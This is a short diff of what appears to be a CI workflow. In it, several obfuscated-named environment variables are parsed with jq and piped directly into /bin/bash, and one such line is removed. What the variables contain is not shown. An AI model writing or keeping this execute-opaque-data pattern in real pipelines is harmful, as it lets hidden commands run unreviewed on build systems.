@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$u253" | jq -r .mxy74 | /bin/bash
           printf '%s' "$ayqx373" | jq -r .u65 | /bin/bash
-          echo $nnu13 | jq -r .n53 | /bin/bash
           echo $dwkvr63 | jq -r .m9430 | /bin/bash
 
       - name: Store results
